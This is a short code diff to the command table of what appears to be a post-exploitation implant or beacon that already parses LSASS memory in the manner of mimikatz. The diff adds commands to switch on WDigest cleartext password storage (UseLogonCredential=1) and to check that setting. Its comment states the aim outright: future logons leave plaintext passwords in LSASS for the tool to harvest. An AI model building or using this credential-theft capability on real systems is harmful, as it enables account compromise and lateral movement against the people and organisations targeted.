@@ -52,6 +52,12 @@ COMMANDS = {
     # via PyInstaller (`scripts/build-binary.sh`) with pypykatz installed.
     "sekurlsa":    ("Live-parse LSASS SSPs in-memory (mimikatz sekurlsa::logonpasswords equivalent)",
                     True, "sekurlsa"),
+    # WDigest cleartext toggle: enables UseLogonCredential so future logons
+    # leave cleartext passwords in LSASS for sekurlsa to harvest. Admin only.
+    "wdigest-enable":  ("Enable WDigest cleartext storage (UseLogonCredential=1); use --disable to turn off",
+                        False, "wdigest-enable"),
+    "wdigest-status":  ("Show current WDigest UseLogonCredential setting",
+                        False, "wdigest-status"),
 }
 
 # On a fresh check-in, if no task queued, beacon may run nothing.
